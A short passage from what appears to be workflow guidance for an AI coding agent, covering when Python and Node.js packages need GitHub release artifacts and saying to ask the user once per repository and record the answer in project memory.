| **Python package** | Depends | If published to PyPI, no GitHub artifact needed; if not, attach the wheel/sdist |
| **Node.js package** | Depends | If published to npm, no GitHub artifact needed; if not, attach the tarball |

When the answer is "ask the user," ask **once** per repo and commit the
answer to project memory so it is never asked again.
